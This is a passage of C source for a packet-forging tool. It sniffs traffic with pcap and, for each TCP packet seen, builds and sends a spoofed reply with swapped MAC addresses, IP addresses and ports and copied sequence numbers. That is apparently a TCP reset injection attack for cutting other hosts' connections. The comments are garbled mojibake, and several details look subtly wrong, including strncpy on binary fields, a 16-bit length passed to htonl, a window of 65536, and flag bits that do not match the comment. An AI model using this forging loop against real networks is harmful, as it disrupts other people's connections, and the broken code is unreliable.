		IPheadlen = IPheadlen >> 4;
		IPheadlen *= 4;

		if (IPheadlen < 20 || IPheadlen > 60)		// �����ͷ���Ȳ��֡�
		{
			printf("��ͷ���Ȳ���ȷ��������ֵΪ��%d\n\n", IPheadlen);
			continue;
		}

		if (Ip4Head->proto == 6)					// ֻ����Ϊ6��TCP��
		{
			TcpHead = (C_TCPHead*)(RecvBuf + 14 + IPheadlen);

			C_EthHead* TempEth = (C_EthHead*)RstPacket;
			C_IP4Head* TempIp4 = (C_IP4Head*)(RstPacket + 14);
			C_TCPHead* TempTcp = (C_TCPHead*)(RstPacket + 14 + sizeof(C_IP4Head));

			// ��ٵ���̫��֡ͷ��ԴMAC��Ŀ��MAC�����������ֶθ���
			strncpy((char*)TempEth->SrcMac, (char*)EthHead->DstMac, 6);
			strncpy((char*)TempEth->DstMac, (char*)EthHead->SrcMac, 6);
			strncpy((char*)&(TempEth->Proto), (char*)&(EthHead->Proto), 2);

			// ��ٵ�IP4ͷ�� �汾���ײ����ȡ�tos�Թ���������������ʶ���Թ�����Ƭ�Թ���TTL=255��proto���ơ�У����Թ���ԴIPĿ��IP����
			strncpy((char*)&(TempIp4->VerAndHeadlen), (char*)&(Ip4Head->VerAndHeadlen), 1);
			TempIp4->VerAndHeadlen >>= 4;
			TempIp4->VerAndHeadlen <<= 4;
			TempIp4->VerAndHeadlen += 5;
			TempIp4->PacketLength = sizeof(C_IP4Head) + sizeof(C_TCPHead);
			TempIp4->PacketLength = htonl(TempIp4->PacketLength);
			TempIp4->TTL = 255;
			strncpy((char*)&(TempIp4->proto), (char*)&(Ip4Head->proto), 1);
			strncpy((char*)&(TempIp4->SrcIP.S_un.S_addr), (char*)&(Ip4Head->DstIP.S_un.S_addr), 4);
			strncpy((char*)&(TempIp4->DstIP.S_un.S_addr), (char*)&(Ip4Head->SrcIP.S_un.S_addr), 4);
			TempIp4->CheckSum = IpCheckSum((short*)TempIp4, 20);

			// ��ٵ�TCPͷ�� Դ�˿�Ŀ�Ķ˿ڽ��������͵�����Ǳ������ߵ�ack-1+4�������յ�������Ǳ������߷������+1�������ֶΡ�rst | ack��־��λ��windowsize���������
			strncpy((char*)&(TempTcp->SrcPort), (char*)&(TcpHead->DstPort), 2);
			strncpy((char*)&(TempTcp->DstPort), (char*)&(TcpHead->SrcPort), 2);
			TempTcp->SeqNumber = TcpHead->AckNumber;
			TempTcp->SeqNumber = htonl(TempTcp->SeqNumber);
			TempTcp->AckNumber = TcpHead->SeqNumber;
			TempTcp->AckNumber = htonl(TempTcp->AckNumber);
			TempTcp->HeadLength = 5;
			TempTcp->HeadLength <<= 4;
			TempTcp->tag = 0;
			TempTcp->tag |= 1;
			//TempTcp->tag |= 1 << 4;
			TempTcp->WindowSize = 65536;
			TempTcp->CheckSum = Tcpchecksum((USHORT*)TempTcp, 20);
			pcap_sendpacket(PcapHandle[DevNumber], (u_char*)RstPacket, sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead));
			//printf("�ѷ��ͣ�\n");
		}
	}

	delete[] RstPacket;
}

// ���������������������ϳ���
short IpCheckSum(short* ip_head_buffer, int ip_hdr_len)
{
	unsigned int check_sum = 0;                    //У��ͳ�ʼ��

	/* У��ͼ��� */
	while (ip_hdr_len > 1)
	{
		check_sum += *ip_head_buffer++;            //һ���ƶ�2�ֽڣ�ע��short intʵ�����ͳ���
		ip_hdr_len -= sizeof(short int);
	}

	/* �����options�ֶ�;һ��Ϊ3�ֽ� */
	if (ip_hdr_len > 0)
	{
		check_sum += *(short int*)ip_head_buffer;  //���ֻ��1�ֽڣ���Ҫ����ת��
	}

	/* ��λ��� */
	check_sum = (check_sum & 0x0000FFFF) + (check_sum >> 16);
	check_sum += (check_sum >> 16);                 //�ϴν�λ��ӵĽ�λ�ټ�һ��
	check_sum = ~check_sum;                         //ȡ��
	return check_sum;
}
SHORT Tcpchecksum(USHORT* buffer, int size)
{
	unsigned long cksum = 0;
	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);	//����16bit���16bit���
	cksum += (cksum >> 16);						//����λ����λ��16bit���16bit �����
	return (USHORT)(~cksum);
}
unsigned int IPStrToInt(const char* ip)
{
	unsigned uResult = 0;
	int nShift = 24;
	int temp = 0;
	const char* pStart = ip;
	const char* pEnd = ip;
	while (*pEnd != '\0')
	{
		while (*pEnd != '.' && *pEnd != '\0')
		{
			pEnd++;
		}
		temp = 0;
		for (pStart; pStart != pEnd; ++pStart)
		{
			temp = temp * 10 + *pStart - '0';
		}
		uResult += temp << nShift;
		nShift -= 8;
		if (*pEnd == '\0')
			break;
		pStart = pEnd + 1;
		pEnd++;
	}
	return uResult;
}